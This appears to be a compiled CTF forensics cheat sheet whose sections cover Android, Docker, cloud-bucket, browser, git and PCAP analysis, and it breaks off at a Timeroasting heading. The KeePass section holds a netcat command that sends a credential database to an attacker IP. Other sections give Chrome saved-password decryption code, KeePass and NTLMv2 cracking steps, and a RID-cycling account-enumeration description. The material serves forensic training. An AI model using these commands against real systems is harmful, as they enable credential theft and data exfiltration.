apktool d base.apk -o decompiled/
# Check: AndroidManifest.xml, res/values/strings.xml, shared_prefs/

# Extract data from Android backup
adb backup -apk -shared -all -f backup.ab
java -jar abe.jar unpack backup.ab backup.tar
tar xf backup.tar

# SQLite databases (contacts, messages, browser history)
sqlite3 /data/data/com.android.providers.contacts/databases/contacts2.db ".tables"
sqlite3 /data/data/com.android.providers.telephony/databases/mmssms.db "SELECT * FROM sms"

# Parse Android filesystem image
mkdir android_mount && mount -o ro android_image.img android_mount/
# Key locations:
# /data/data/<app>/databases/     — app SQLite databases
# /data/data/<app>/shared_prefs/  — app preferences (XML)
# /data/system/packages.xml       — installed packages
# /data/misc/wifi/wpa_supplicant.conf — saved WiFi passwords
```

**Key insight:** Android stores app data in `/data/data/<package>/` with SQLite databases and XML shared preferences. `adb backup` captures the full app state. For CTFs, check `shared_prefs/` for hardcoded secrets and `databases/` for flags.

---

### Container Forensics (Docker)

```bash
# Export Docker image layers
docker save IMAGE:TAG -o image.tar
tar xf image.tar
# Each layer is a directory with layer.tar containing filesystem changes
# Check: layer.tar files for added/modified files, deleted files (.wh.* whiteout)

# Inspect image history for build commands (may contain secrets)
docker history IMAGE:TAG --no-trunc
# Shows every Dockerfile instruction including ARGs and ENV values

# Extract filesystem without running the container
docker create --name extract IMAGE:TAG
docker export extract -o container_fs.tar
docker rm extract

# Analyze with dive (layer-by-layer diff viewer)
dive IMAGE:TAG

# Common forensic targets in container images:
# /app/.env, /app/config/* — application secrets
# /root/.bash_history     — build-time commands
# /etc/shadow             — leaked credentials
# Deleted files visible in earlier layers even if removed in later ones
```

**Key insight:** Docker images are layered — a file deleted in a later layer still exists in the earlier layer's tar. Use `docker history --no-trunc` to see full Dockerfile commands including secrets passed via `ARG` or `ENV`. The `dive` tool visualizes layer diffs interactively.

---

### Cloud Storage Forensics (AWS S3 / GCP / Azure)

```bash
# Enumerate public S3 buckets
aws s3 ls s3://target-bucket/ --no-sign-request
aws s3 cp s3://target-bucket/flag.txt . --no-sign-request

# Check bucket versioning (previous versions may contain deleted flags)
aws s3api list-object-versions --bucket target-bucket --no-sign-request
aws s3api get-object --bucket target-bucket --key secret.txt --version-id VERSION_ID out.txt

# GCP Cloud Storage
gsutil ls gs://target-bucket/
gsutil cp gs://target-bucket/flag.txt .

# Azure Blob Storage
az storage blob list --container-name target --account-name storageaccount
az storage blob download --container-name target --name flag.txt --account-name storageaccount
```

**Key insight:** Cloud storage versioning preserves deleted objects. Even if a flag file is deleted from the bucket, previous versions may still be accessible via `list-object-versions`. Always check for versioning-enabled buckets.



---

<!-- Source: linux-forensics.md -->

# CTF Forensics - Linux and Application Forensics

## Table of Contents
- [Log Analysis](#log-analysis)
- [Linux Attack Chain Forensics](#linux-attack-chain-forensics)
- [Docker Image Forensics (Pragyan 2026)](#docker-image-forensics-pragyan-2026)
- [Browser Credential Decryption](#browser-credential-decryption)
- [Firefox Browser History (places.sqlite)](#firefox-browser-history-placessqlite)
- [USB Audio Extraction from PCAP](#usb-audio-extraction-from-pcap)
- [TFTP Netascii Decoding](#tftp-netascii-decoding)
- [TLS Traffic Decryption via Weak RSA](#tls-traffic-decryption-via-weak-rsa)
- [ROT18 Decoding](#rot18-decoding)
- [Common Encodings](#common-encodings)
- [Git Directory Recovery (UTCTF 2024)](#git-directory-recovery-utctf-2024)
- [KeePass Database Extraction and Cracking (H7CTF 2025)](#keepass-database-extraction-and-cracking-h7ctf-2025)
- [Git Reflog and fsck for Squashed Commit Recovery (BearCatCTF 2026)](#git-reflog-and-fsck-for-squashed-commit-recovery-bearcatctf-2026)
- [Browser Artifact Analysis](#browser-artifact-analysis)
  - [Chrome/Chromium](#chromechromium)
  - [Firefox](#firefox)
- [Corrupted Git Blob Repair via Byte Brute-Force (CSAW CTF 2015)](#corrupted-git-blob-repair-via-byte-brute-force-csaw-ctf-2015)

---

## Log Analysis

```bash
# Search for flag fragments
grep -iE "(flag|part|piece|fragment)" server.log

# Reconstruct fragmented flags
grep "FLAGPART" server.log | sed 's/.*FLAGPART: //' | uniq | tr -d '\n'

# Find anomalies
sort logfile.log | uniq -c | sort -rn | head
```

---

## Linux Attack Chain Forensics

**Pattern (Making the Naughty List):** Full attack timeline from logs + PCAP + malware.

**Evidence sources:**
```bash
# SSH session commands
grep -A2 "session opened" /var/log/auth.log

# User command history
cat /home/*/.bash_history

# Downloaded malware
find /usr/bin -newer /var/log/auth.log -name "ms*"

# Network exfiltration
tshark -r capture.pcap -Y "tftp" -T fields -e tftp.source_file
```

**Common malware pattern:** AES-ECB encrypt + XOR with same key, save as .enc

---

## Docker Image Forensics (Pragyan 2026)

**Pattern (Plumbing):** Sensitive data leaked during Docker build but cleaned in later layers.

**Key insight:** Docker image config JSON (`blobs/sha256/<config_hash>`) permanently preserves ALL `RUN` commands in the `history` array, regardless of subsequent cleanup.

```bash
tar xf app.tar
# Find config blob (not layer blobs)
python3 -m json.tool blobs/sha256/<config_hash> | grep -A2 "created_by"
# Look for RUN commands with flag data, passwords, secrets
```

**Analysis steps:**
1. Extract the Docker image tar: `tar xf app.tar`
2. Read `manifest.json` to find the config blob hash
3. Parse the config blob JSON for `history[].created_by` entries
4. Each entry shows the exact Dockerfile command that was run
5. Secrets echoed, written, or processed in any `RUN` command are preserved in the history
6. Even if a later layer `rm -f secret.txt`, the `RUN echo "flag{...}" > secret.txt` remains visible

---

## Browser Credential Decryption

**Chrome/Edge Login Data decryption (requires master_key.txt):**
```python
from Crypto.Cipher import AES
import sqlite3, json, base64

# Load master key (from Local State file, DPAPI-protected)
with open('master_key.txt', 'rb') as f:
    master_key = f.read()

conn = sqlite3.connect('Login Data')
cursor = conn.cursor()
cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
for url, user, encrypted_pw in cursor.fetchall():
    # v10/v11 prefix = AES-GCM encrypted
    nonce = encrypted_pw[3:15]
    ciphertext = encrypted_pw[15:-16]
    tag = encrypted_pw[-16:]
    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
    password = cipher.decrypt_and_verify(ciphertext, tag)
    print(f"{url}: {user}:{password.decode()}")
```

**Master key extraction from Local State:**
```python
import json, base64
with open('Local State', 'r') as f:
    local_state = json.load(f)
encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
# Remove DPAPI prefix (5 bytes "DPAPI")
encrypted_key = encrypted_key[5:]
# On Windows: CryptUnprotectData to get master_key
# In CTF: master_key may be provided separately
```

---

## Firefox Browser History (places.sqlite)

**Pattern (Browser Wowser):** Flag hidden in browser history URLs.

```bash
# Quick method
strings places.sqlite | grep -i "flag\|MetaCTF"

# Proper forensic method
sqlite3 places.sqlite "SELECT url FROM moz_places WHERE url LIKE '%flag%'"
```

**Key tables:** `moz_places` (URLs), `moz_bookmarks`, `moz_cookies`

---

## USB Audio Extraction from PCAP

**Pattern (Talk To Me):** USB isochronous transfers contain audio data.

**Extraction workflow:**
```bash
# Export ISO data with tshark
tshark -r capture.pcap -T fields -e usb.iso.data > audio_data.txt

# Convert to raw audio and import into Audacity
# Settings: signed 16-bit PCM, mono, appropriate sample rate
# Listen for spoken flag characters
```

**Identification:** USB transfer type URB_ISOCHRONOUS = real-time audio/video

---

## TFTP Netascii Decoding

**Problem:** TFTP netascii mode corrupts binary transfers; Wireshark doesn't auto-decode.

**Fix exported files:**
```python
# Replace netascii sequences:
# 0d 0a → 0a (CRLF → LF)
# 0d 00 → 0d (escaped CR)
with open('file_raw', 'rb') as f:
    data = f.read()
data = data.replace(b'\r\n', b'\n').replace(b'\r\x00', b'\r')
with open('file_fixed', 'wb') as f:
    f.write(data)
```

---

## TLS Traffic Decryption via Weak RSA

**Pattern (Tampered Seal):** TLS 1.2 with `TLS_RSA_WITH_AES_256_CBC_SHA` (no PFS).

**Attack flow:**
1. Extract server certificate from Server Hello packet (Export Packet Bytes -> `public.der`)
2. Get modulus: `openssl x509 -in public.der -inform DER -noout -modulus`
3. Factor weak modulus (dCode, factordb.com, yafu)
4. Generate private key: `rsatool -p P -q Q -o private.pem`
5. Add to Wireshark: Edit -> Preferences -> TLS -> RSA keys list

**After decryption:**
- Follow TLS streams to see HTTP traffic
- Export objects (File -> Export Objects -> HTTP)
- Look for downloaded executables, API calls

---

## ROT18 Decoding

ROT13 on letters + ROT5 on digits. Common final layer in multi-stage forensics:
```python
def rot18(text):
    result = []
    for c in text:
        if c.isalpha():
            base = ord('a') if c.islower() else ord('A')
            result.append(chr((ord(c) - base + 13) % 26 + base))
        elif c.isdigit():
            result.append(str((int(c) + 5) % 10))
        else:
            result.append(c)
    return ''.join(result)
```

---

## Common Encodings

```bash
echo "base64string" | base64 -d
echo "hexstring" | xxd -r -p
# ROT13: tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

---

## Git Directory Recovery (UTCTF 2024)

```bash
# Exposed .git directory on web server
gitdumper.sh https://target/.git/ /tmp/repo

# Check reflog for old commits with secrets
cat .git/logs/HEAD
# Download objects from .git/objects/XX/YYYY, decompress with zlib
```

**Tool:** `gitdumper.sh` from internetwache/GitTools is most reliable.

---

## KeePass Database Extraction and Cracking (H7CTF 2025)

**Pattern (Moby Dock):** KeePass database (`.kdbx`) found on compromised system contains SSH keys or credentials for lateral movement.

**Transfer from remote system:**
```bash
# On target: base64 encode and send via netcat
base64 .system.kdbx | nc attacker_ip 4444

# On attacker: receive and decode
nc -lvnp 4444 > kdbx.b64 && base64 -d kdbx.b64 > system.kdbx
```

**Cracking KeePass v4 databases:**
```bash
# Standard keepass2john (KeePass v3 only)
keepass2john system.kdbx > hash.txt

# For KeePass v4 (KDBX 4.x with Argon2): use custom fork
git clone https://github.com/ivanmrsulja/keepass2john.git
cd keepass2john && make
./keepass2john system.kdbx > hash.txt

# Alternative: keepass4brute (direct brute-force)
python3 keepass4brute.py -d wordlist.txt system.kdbx
```

**Wordlist generation from challenge context:**
```bash
# Generate wordlist from related website content
cewl http://target:8080 -d 2 -m 5 -w cewl_words.txt

# Add theme-related keywords manually
echo -e "expectopatronum\nharrypotter\nalohomora" >> cewl_words.txt

# Crack with hashcat (Argon2 = mode 13400)
hashcat -m 13400 hash.txt cewl_words.txt
```

**After cracking — extract credentials:**
1. Open `.kdbx` in KeePassXC with recovered password
2. Check all entries for SSH private keys, passwords, API tokens
3. SSH keys are typically stored in the "Notes" or "Advanced" attachment fields

**Key insight:** Standard `keepass2john` does not support KeePass v4 (KDBX 4.x) databases that use Argon2 key derivation. Use the `ivanmrsulja/keepass2john` fork or `keepass4brute` for v4 support. Generate context-aware wordlists with `cewl` targeting related web services.

---

## Git Reflog and fsck for Squashed Commit Recovery (BearCatCTF 2026)

**Pattern (Poem About Pirates):** Git repository with clean history where data was overwritten and history rewritten via `git rebase --squash`. The original commits survive as orphaned objects.

**Recovery steps:**
```bash
# Check reflog for rebase/squash operations
git reflog --all

# Find orphaned (unreachable) commits
git fsck --unreachable --no-reflogs

# Inspect each unreachable commit
git show <commit-hash>
git diff <commit-hash>^ <commit-hash>

# Extract specific file version from orphaned commit
git show <commit-hash>:path/to/file
```

**Key insight:** `git rebase --squash` removes commits from the branch history but doesn't delete the underlying objects. They remain as unreachable objects until garbage collection runs (`git gc`). Even after `git gc`, objects younger than the expiry period (default 2 weeks) survive. Always check `git reflog` and `git fsck --unreachable` when investigating git repos for hidden data.

**Detection:** Git repo with suspiciously clean history (single commit, or squash-merge commits). Challenge mentions "rewrite", "rebase", "squash", or "clean history".

---

## Browser Artifact Analysis

### Chrome/Chromium

```bash
# Default profile locations
# Linux: ~/.config/google-chrome/Default/
# macOS: ~/Library/Application Support/Google/Chrome/Default/
# Windows: %LOCALAPPDATA%\Google\Chrome\User Data\Default\

# History (SQLite)
sqlite3 "History" "SELECT url, title, datetime(last_visit_time/1000000-11644473600,'unixepoch') FROM urls ORDER BY last_visit_time DESC LIMIT 50;"

# Downloads
sqlite3 "History" "SELECT target_path, tab_url, datetime(start_time/1000000-11644473600,'unixepoch') FROM downloads;"

# Cookies (encrypted on modern Chrome — need DPAPI/keychain key)
sqlite3 "Cookies" "SELECT host_key, name, datetime(expires_utc/1000000-11644473600,'unixepoch') FROM cookies;"

# Login Data (passwords — encrypted)
sqlite3 "Login Data" "SELECT origin_url, username_value FROM logins;"

# Bookmarks (JSON)
cat Bookmarks | python3 -m json.tool | grep -A2 '"url"'

# Local Storage / IndexedDB — LevelDB format
# Use leveldb-dump or strings on LevelDB files
strings "Local Storage/leveldb/"*.ldb | grep -i flag
```

### Firefox

```bash
# Profile location: ~/.mozilla/firefox/*.default-release/
# Find profile
ls ~/.mozilla/firefox/ | grep default

# History + bookmarks (places.sqlite)
sqlite3 places.sqlite "SELECT url, title, datetime(last_visit_date/1000000,'unixepoch') FROM moz_places WHERE last_visit_date IS NOT NULL ORDER BY last_visit_date DESC LIMIT 50;"

# Form history
sqlite3 formhistory.sqlite "SELECT fieldname, value FROM moz_formhistory;"

# Saved passwords (requires key4.db + logins.json)
# Use firefox_decrypt: python3 firefox_decrypt.py ~/.mozilla/firefox/PROFILE/

# Session restore (previous tabs)
python3 -c "
import json, lz4.block
with open('sessionstore-backups/recovery.jsonlz4','rb') as f:
    f.read(8)  # skip magic
    data = json.loads(lz4.block.decompress(f.read()))
    for w in data['windows']:
        for t in w['tabs']:
            print(t['entries'][-1]['url'])
"
```

**Key insight:** Browser artifacts are SQLite databases with non-standard timestamp formats. Chrome uses WebKit epoch (microseconds since 1601-01-01), Firefox uses Unix epoch in microseconds. Always check History, Cookies, Login Data, Local Storage, and session restore files. For encrypted passwords, you need the master key (DPAPI on Windows, keychain on macOS, key4.db on Firefox).

---

## Corrupted Git Blob Repair via Byte Brute-Force (CSAW CTF 2015)

**Pattern (sharpturn):** Git repository with corrupted blob objects. Since git identifies objects by SHA-1 hash, a single-byte corruption changes the hash, making the object unreadable. Repair by brute-forcing each byte position until `git hash-object` produces the expected hash.

```python
import subprocess, shutil

def repair_blob(filepath, target_hash):
    """Brute-force single-byte corruption in a git blob."""
    with open(filepath, 'rb') as f:
        data = bytearray(f.read())

    for pos in range(len(data)):
        original = data[pos]
        for val in range(256):
            if val == original:
                continue
            data[pos] = val
            with open(filepath, 'wb') as f:
                f.write(data)
            result = subprocess.run(
                ['git', 'hash-object', filepath],
                capture_output=True, text=True
            )
            if result.stdout.strip() == target_hash:
                print(f"Fixed byte {pos}: 0x{original:02x} -> 0x{val:02x}")
                return True
            data[pos] = original

    with open(filepath, 'wb') as f:
        f.write(data)
    return False
```

**Workflow:**
1. `git fsck` to identify corrupted objects and their expected hashes
2. Locate the corrupt blob files in `.git/objects/`
3. Decompress with `python3 -c "import zlib; print(zlib.decompress(open('blob','rb').read()))"`
4. Brute-force each byte position (256 values * file_size attempts)
5. Verify with `git hash-object` matching the expected hash

**Key insight:** Git's content-addressable storage means the expected SHA-1 hash is known from the commit tree, even when the blob is corrupted. Single-byte corruption is brute-forceable in seconds. For multi-byte corruption, combine with contextual knowledge (e.g., source code must compile, numeric constants must be valid).



---

<!-- Source: network-advanced.md -->

# CTF Forensics - Network (Advanced)

## Table of Contents
- [Packet Interval Timing-Based Encoding (EHAX 2026)](#packet-interval-timing-based-encoding-ehax-2026)
- [USB HID Mouse/Pen Drawing Recovery (EHAX 2026)](#usb-hid-mousepen-drawing-recovery-ehax-2026)
- [NTLMv2 Hash Cracking from PCAP (Pragyan 2026)](#ntlmv2-hash-cracking-from-pcap-pragyan-2026)
- [TCP Flag Covert Channel (BearCatCTF 2026)](#tcp-flag-covert-channel-bearcatctf-2026)
- [DNS Query Name Last-Byte Steganography (UTCTF 2026)](#dns-query-name-last-byte-steganography-utctf-2026)
  - [DNS Trailing Byte Binary Encoding (UTCTF 2026)](#dns-trailing-byte-binary-encoding-utctf-2026)
- [Multi-Layer PCAP with XOR + ZIP (UTCTF 2026)](#multi-layer-pcap-with-xor--zip-utctf-2026)
- [Brotli Decompression Bomb Seam Analysis (BearCatCTF 2026)](#brotli-decompression-bomb-seam-analysis-bearcatctf-2026)
- [SMB RID Recycling via LSARPC (Midnight 2026)](#smb-rid-recycling-via-lsarpc-midnight-2026)
- [Timeroasting / MS-SNTP Hash Extraction (Midnight 2026)](#timeroasting--ms-sntp-hash-extraction-midnight-2026)

---

## Packet Interval Timing-Based Encoding (EHAX 2026)

**Pattern (Breathing Void):** Large PCAPNG with millions of packets, but only a few hundred on one interface carry data. The signal is in the **timing gaps** between identical packets, not their content.

**Identification:** Challenge mentions "breathing", "void", "silence", or timing. PCAP has many interfaces but only one has interesting traffic. Packets are identical but spaced at two distinct intervals.

**Decoding workflow:**
```python
from scapy.all import rdpcap

packets = rdpcap('challenge.pcapng')

# 1. Filter to the right interface (e.g., interface 2)
# tshark: tshark -r challenge.pcapng -Y "frame.interface_id == 2" -T fields -e frame.time_epoch

# 2. Compute inter-packet intervals
times = [float(pkt.time) for pkt in packets if pkt.sniffed_on == 'interface_2']
intervals = [times[i+1] - times[i] for i in range(len(times)-1)]

# 3. Identify binary mapping (two distinct interval values)
# E.g., 10ms → 0, 100ms → 1 (threshold at ~50ms)
threshold = 0.05  # 50ms
bits = [0 if dt < threshold else 1 for dt in intervals]

# 4. May need to prepend a leading 0 bit (first interval has no predecessor)
bits = [0] + bits

# 5. Convert bits to bytes (MSB-first)
data = bytes(int(''.join(str(b) for b in bits[i:i+8]), 2)
             for i in range(0, len(bits) - 7, 8))
print(data.decode(errors='replace'))
```

**Key insight:** When identical packets appear on a single interface with only two practical interval values, it's almost certainly binary encoding via timing. The content is noise — the signal is in the gaps. Filter by interface and count unique intervals first.

**Scale tip:** Large PCAPs (millions of packets) often have the signal in a tiny subset. Triage with `tshark -q -z io,phs` to find which interface has the fewest packets — that's likely the data carrier.
---

## USB HID Mouse/Pen Drawing Recovery (EHAX 2026)

**Pattern (Painter):** PCAP contains USB HID interrupt transfers from a mouse/pen device. Drawing data encoded as relative movements with multiple draw modes.

**Packet format (7-byte HID reports):**
| Byte | Field | Notes |
|------|-------|-------|
| 0 | Button state | 0x01 = pressed (may be constant) |
| 1 | Mode/pad | 0=hover, 1=draw mode 1, 2=draw mode 2 |
| 2-3 | dx (int16 LE) | Relative X movement |
| 4-5 | dy (int16 LE) | Relative Y movement |
| 6 | Wheel | Usually 0 |

**Extraction and rendering:**
```python
import struct
from PIL import Image, ImageDraw

# Extract HID data
# tshark -r capture.pcap -Y "usb.transfer_type==1" -T fields -e usb.capdata

packets = []
with open('hid_data.txt') as f:
    for line in f:
        raw = bytes.fromhex(line.strip().replace(':', ''))
        if len(raw) >= 7:
            btn = raw[0]
            mode = raw[1]
            dx = struct.unpack('<h', raw[2:4])[0]
            dy = struct.unpack('<h', raw[4:6])[0]
            packets.append((btn, mode, dx, dy))

# Accumulate positions per mode
SCALE = 5
positions = {0: [], 1: [], 2: []}
x, y = 0, 0
for btn, mode, dx, dy in packets:
    x += dx
    y += dy
    positions[mode].append((x, y))

# Render each mode separately (different colors = different text layers)
for mode in [1, 2]:
    pts = positions[mode]
    if not pts:
        continue
    min_x = min(p[0] for p in pts) - 100
    min_y = min(p[1] for p in pts) - 100
    max_x = max(p[0] for p in pts) + 100
    max_y = max(p[1] for p in pts) + 100
    w = (max_x - min_x) * SCALE
    h = (max_y - min_y) * SCALE
    img = Image.new('RGB', (w, h), 'white')
    draw = ImageDraw.Draw(img)
    for i in range(1, len(pts)):
        x0 = (pts[i-1][0] - min_x) * SCALE
        y0 = (pts[i-1][1] - min_y) * SCALE
        x1 = (pts[i][0] - min_x) * SCALE
        y1 = (pts[i][1] - min_y) * SCALE
        # Skip long jumps (pen lifts)
        if abs(pts[i][0]-pts[i-1][0]) < 50 and abs(pts[i][1]-pts[i-1][1]) < 50:
            draw.line([(x0,y0),(x1,y1)], fill='black', width=3)
    img.save(f'mode_{mode}.png')
```

**Key techniques:**
- **Separate modes:** Different button/mode values draw different text layers — render each independently
- **Skip pen lifts:** Large dx/dy jumps indicate pen was lifted, not drawn — filter by distance threshold
- **High resolution:** Scale 5-8x with margins for readable handwriting
- **Time gradient:** Color points by temporal order (rainbow gradient) to trace stroke direction
- **Character segmentation:** Group consecutive same-mode points by large X gaps to isolate characters

**Alternative: AWK extraction + SVG rendering (faster pipeline):**
```bash
# Extract capdata and convert to signed deltas in one pass
tshark -r pref.pcap -Y "usb.transfer_type==0x01 && usb.endpoint_address==0x81 && usb.capdata" \
  -T fields -e usb.capdata > capdata.txt

awk '
function hexval(c){ return index("0123456789abcdef",tolower(c))-1 }
function hex2dec(h, n,i){ n=0; for(i=1;i<=length(h);i++) n=n*16+hexval(substr(h,i,1)); return n }
function s16(u){ return (u>=32768)?u-65536:u }
{ d=$1; if(length(d)!=14) next
  btn=hex2dec(substr(d,3,2))
  x=s16(hex2dec(substr(d,7,2) substr(d,5,2)))
  y=s16(hex2dec(substr(d,11,2) substr(d,9,2)))
  print btn, x, y }' capdata.txt > deltas.txt
```
Then render with SVG (Python) — filter on pen-down state (button=2), accumulate deltas, flip Y axis, draw strokes between consecutive pen-down points.

**Difference from keyboard HID:** Mouse HID uses relative movements (accumulated), keyboard uses keycodes (direct). Mouse drawing requires rendering; keyboard requires keymap lookup.

---

## NTLMv2 Hash Cracking from PCAP (Pragyan 2026)

**Pattern ($whoami):** SMB2 authentication in packet capture.

**Extraction:** From NTLMSSP_AUTH packet, extract: server challenge, NTProofStr, and blob.

**Brute-force with known password format:**
```python
import hashlib, hmac
from Crypto.Hash import MD4

def try_password(password, username, domain, server_challenge, blob, expected_proof):
    nt_hash = MD4.new(password.encode('utf-16-le')).digest()
    identity = (username.upper() + domain).encode('utf-16-le')
    ntlmv2_hash = hmac.new(nt_hash, identity, hashlib.md5).digest()
    proof = hmac.new(ntlmv2_hash, server_challenge + blob, hashlib.md5).digest()
    return proof == expected_proof
```

---

## TCP Flag Covert Channel (BearCatCTF 2026)

**Pattern (pCapsized):** Suspicious TCP packets with chaotic flag combinations (FIN+SYN, SYN+RST+PSH+URG, etc.). The 6 TCP flag bits encode base64 characters.

**Decoding:**
```python
from scapy.all import rdpcap, TCP

pkts = rdpcap('capture.pcap')
suspicious = [p for p in pkts if TCP in p and p[TCP].dport == 5748]

# Map 6-bit flag value to base64 alphabet
b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
encoded = ''.join(b64[p[TCP].flags & 0x3F] for p in suspicious)

import base64
flag = base64.b64decode(encoded).decode()
```

**Key insight:** TCP has 6 standard flag bits (FIN, SYN, RST, PSH, ACK, URG) = values 0-63, matching the base64 alphabet exactly. Unusual flag combinations on otherwise normal-looking packets indicate covert channel usage. Filter by destination port or source IP to isolate the channel.

**Detection:** Packets with nonsensical flag combinations (e.g., FIN+SYN simultaneously). Consistent destination port. Packet count is a multiple of 4 (base64 alignment).

---

## DNS Query Name Last-Byte Steganography (UTCTF 2026)

**Pattern (Last Byte Standing):** PCAP with DNS queries where data is encoded in the last byte of each query name.

**Identification:** Many DNS queries to unusual or sequential subdomains. The meaningful data is NOT in the query name itself but in the final byte/character of each name.

**Decoding workflow:**
```python
from scapy.all import rdpcap, DNS, DNSQR

packets = rdpcap('last-byte-standing.pcap')

data = []
for pkt in packets:
    if pkt.haslayer(DNSQR):
        qname = pkt[DNSQR].qname.decode(errors='replace').rstrip('.')
        if qname:
            data.append(qname[-1])  # Last character of query name

# Reconstruct message from last bytes
message = ''.join(data)
print(message)
# May need additional decoding (hex, base64, etc.)
```

**Variants:**
- Last byte of each subdomain label (split on `.`)
- Specific character position (first, Nth, last)
- Hex-encoded bytes across multiple queries
- Subdomain labels as base32/base64 chunks (DNS tunneling)
- **Trailing byte after DNS question structure** (see below)

**Key insight:** DNS exfiltration often hides data in query names. When queries look random but follow a pattern, extract specific character positions. The "last byte" pattern is simple but effective — each query contributes one byte to the message.

**Detection:** Large number of DNS queries to a single domain, queries with no legitimate purpose, sequential or patterned subdomain names.

### DNS Trailing Byte Binary Encoding (UTCTF 2026)

**Pattern (Last Byte Standing variant):** Each DNS query packet contains a single extra byte appended AFTER the standard DNS question structure (after the null terminator + Type A + Class IN fields). The extra byte is `0x30` ('0') or `0x31` ('1'), encoding one bit per packet.

**Decoding workflow:**
```python
from scapy.all import rdpcap, DNS, DNSQR, Raw

packets = rdpcap('challenge.pcap')

bits = []
for pkt in packets:
    if pkt.haslayer(DNSQR):
        # Get raw DNS payload
        raw = bytes(pkt[DNS])
        # Standard DNS question ends at: header(12) + qname + null(1) + type(2) + class(2)
        qname = pkt[DNSQR].qname
        expected_len = 12 + len(qname) + 1 + 2 + 2  # +1 for leading length byte
        if len(raw) > expected_len:
            trailing = raw[expected_len:]
            for b in trailing:
                bits.append(chr(b))  # '0' or '1'

# Convert bit string to ASCII (MSB-first, 8-bit chunks)
bitstring = ''.join(bits)
flag = ''.join(chr(int(bitstring[i:i+8], 2)) for i in range(0, len(bitstring) - 7, 8))
print(flag)
```

**Key insight:** Data is hidden not in the DNS query name but in extra bytes padding the packet after the question record. Wireshark hex inspection reveals non-standard packet lengths. Each trailing byte represents ASCII '0' or '1', forming a binary stream that decodes to the flag.

**Detection:** DNS packets slightly larger than expected for their query name. Hex dump shows `0x30`/`0x31` bytes after the Class IN field (`00 01`). Consistent query domain across all packets.

---

## Multi-Layer PCAP with XOR + ZIP (UTCTF 2026)

**Pattern (Half Awake):** PCAP with multiple protocol layers hiding data. Requires protocol-aware extraction, XOR decryption with a key found in-band, and merging parallel data streams.

**Detailed workflow:**

1. **Inspect HTTP streams** for instructions or hints (e.g., "mDNS names are hints", "Not every TCP blob is what it pretends to be")
2. **Identify fake protocol streams:** A TCP stream labeled as TLS may actually contain a raw ZIP file (PK magic bytes `50 4b`). Check raw hex of suspicious streams
3. **Extract XOR key from mDNS:** Look for mDNS TXT records (e.g., `key.version.local`) containing the XOR key
4. **XOR-decrypt** the extracted data using the mDNS key
5. **Merge parallel datasets** using printability as selector

```python
import string
from scapy.all import rdpcap, Raw, DNS, DNSRR

packets = rdpcap('half-awake.pcap')

# 1. Extract XOR key from mDNS TXT record
xor_key = None
for pkt in packets:
    if pkt.haslayer(DNSRR):
        rr = pkt[DNSRR]
        if b'key' in rr.rrname.lower():
            xor_key = int(rr.rdata, 16)  # e.g., 0xb7

# 2. Extract fake TLS stream (look for PK header in raw TCP data)
# Use Wireshark: tcp.stream eq N → Export raw bytes
# Or extract with scapy by filtering the right stream

# 3. XOR-decrypt two datasets from ZIP contents
def xor_decrypt(data, key):
    return bytes(b ^ key for b in data)

p1 = xor_decrypt(stage1_data, xor_key)
p2 = xor_decrypt(stage2_data, xor_key)

# 4. Merge using printability: take the printable character from each position
flag = ''.join(
    chr(p1[i]) if chr(p1[i]) in string.printable and chr(p1[i]).isprintable()
    else chr(p2[i])
    for i in range(len(p1))
)
print(flag)
```

**Key insight:** When a PCAP contains two XOR-decoded byte arrays of equal length where neither alone produces readable text, merge them character-by-character using printability as the selector — take whichever byte at each position is a printable ASCII character. The XOR key is often hidden in an in-band protocol like mDNS TXT records rather than requiring brute-force.

**Indicators:**
- HTTP stream with meta-instructions ("not every TCP blob is what it pretends to be")
- TCP stream with mismatched protocol dissection (Wireshark shows TLS but raw bytes contain PK/ZIP headers)
- mDNS queries for suspicious service names (e.g., `key.version.local`)
- Two data files of identical length in extracted archive

---

## Brotli Decompression Bomb Seam Analysis (BearCatCTF 2026)

**Pattern (Cursed Map):** HTTP download of a file that decompresses to gigabytes (decompression bomb). The flag is sandwiched between two bomb halves at a seam in the compressed data.

**Identification:** Compressed data shows a repeating block pattern (e.g., 105-byte period). One block breaks the pattern — the flag is at this discontinuity.

```python
import brotli

with open('flag.txt.br', 'rb') as f:
    data = f.read()

# Find the repeating block size
block_size = 105  # Determined by comparing adjacent blocks
for i in range(0, len(data) - block_size, block_size):
    if data[i:i+block_size] != data[i+block_size:i+2*block_size]:
        seam_offset = i + block_size
        break

# Decompress only the anomalous block
dec = brotli.Decompressor()
result = dec.process(data[seam_offset:seam_offset+block_size])
# Flag is in the decompressed output
```

**Key insight:** Decompression bombs use highly repetitive compressed data. The flag breaks this repetition, creating a detectable anomaly in the compressed stream. Compare adjacent fixed-size blocks to find the discontinuity, then decompress only that region — no need to decompress the entire multi-gigabyte output.

**Detection:** File with extreme compression ratio (MB → GB), HTTP Content-Encoding: br, or file identified as Brotli. Tools hang or OOM when trying to decompress.

---

## SMB RID Recycling via LSARPC (Midnight 2026)

**Pattern (UntilTime):** PCAP with SMB2 authentication followed by RPC calls over `\pipe\lsarpc`. The attacker enumerates Active Directory accounts by iterating RIDs (Relative Identifiers) through LSARPC functions.

**Identification:** SMB2 session setup with multiple authentication attempts (null session, Guest, random username), followed by RPC bind to LSARPC and repeated `LsaLookupSids` calls with incrementing RIDs.

**Wireshark analysis:**
```bash
# Filter SMB2 authentication attempts from attacker IP
tshark -r capture.pcapng -Y "ip.src == 198.51.100.16 && smb2.cmd == 1"

# Look for LSARPC RPC calls
tshark -r capture.pcapng -Y "dcerpc.cn_bind_to_str contains lsarpc"
```

**RPC call sequence:**
1. `LsaOpenPolicy` — opens a policy handle on the target
2. `LsaQueryInformationPolicy` — extracts the domain SID (e.g., `S-1-5-21-...`)
3. `LsaLookupSids` — resolves SIDs to account names by iterating RIDs (1000, 1001, 1002, ...)

**Key insight:** Guest account authentication (often enabled by default) grants enough access to enumerate domain accounts via LSARPC. The attacker constructs SIDs by appending incrementing RIDs to the domain SID and calling `LsaLookupSids` for each. Valid accounts return their name; invalid RIDs return errors. This technique is called **RID cycling** or **RID brute-forcing**.

**Detection indicators:**
- Multiple `LsaLookupSids` requests with sequential RIDs
- Guest authentication success followed by RPC pipe connection
- High volume of LSARPC traffic from a single source

---

## Timeroasting / MS-SNTP Hash Extraction (Midnight 2026)

